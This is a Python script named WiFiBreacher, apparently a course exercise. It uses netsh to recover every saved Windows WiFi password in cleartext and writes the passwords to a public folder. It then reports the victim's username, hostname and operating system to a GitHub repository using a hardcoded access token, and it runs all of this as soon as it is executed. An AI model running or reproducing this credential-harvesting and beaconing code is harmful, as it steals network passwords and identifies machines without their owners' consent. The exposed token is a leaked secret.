class WiFiBreacher():
    def __init__(self, script_name):
        self.script_name = script_name
    
    def create_log(self,script_name,status):
        '''This function will create a log (succes/failed) depending on the script's results'''
        import socket
        import platform
        import base64
        import getpass
        import datetime
        from github import Github
        import datetime
        ACCESS_TOKEN ='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'
        FOLDER_PATH ='logs'
        current_datetime = datetime.datetime.now()
        content = f"Script Name: {script_name}\nExecution time: {current_datetime}\nStatus: {status}\n\n"
        username = getpass.getuser()
        hostname = socket.gethostname()
        os_name = platform.system()
        filename = os_name + "_" + hostname + "_" + username
        g = Github(ACCESS_TOKEN)
        repo = g.get_repo("rsecurity12/python_opdracht")
        
        try:
            existing_file = repo.get_contents(f"{FOLDER_PATH}/{filename}")
            sha = existing_file.sha
            existing_content = base64.b64decode(existing_file.content).decode()
            new_content = existing_content + '\n' + content
            repo.update_file(existing_file.path, "Update log", new_content, sha)
        except Exception as e:
            if 'Not Found' in str(e):
                new_file = repo.create_file(f"{FOLDER_PATH}/{filename}", "New log", content)
            else:
                pass
        
    def run(self):
        '''This function will try to recover saved WiFi passwords and send its output to C: Users Public wifi_data'''
        import subprocess
        import re
        import os
        wifi_path = "C:\\Users\\Public\\wiFi_output"
        if not os.path.exists(wifi_path):
            os.makedirs(wifi_path)
        command_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8')
        profile_names = re.findall(r':\s(.*)\r', command_output)
        wifi_passwords = []
    
        for name in profile_names:
            password_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8')
            password = re.search(r'Key Content\s*: (.*)\r', password_output)
            if password:
                wifi_passwords.append((name, password.group(1)))

        if wifi_passwords:
            for name, password in wifi_passwords:
                file_path = os.path.join(wifi_path, f"{name}_password.txt")
                with open(file_path, 'w') as file:
                    file.write(f"Network Name: {name}\n")
                    file.write(f"Password: {password}\n")
        else:
            pass

wifi_breacher = WiFiBreacher("WiFiBreacher")
try:
    wifi_breacher.run()
    wifi_breacher.create_log(wifi_breacher.script_name,"success")
except:
    wifi_breacher.create_log(wifi_breacher.script_name,"failed")
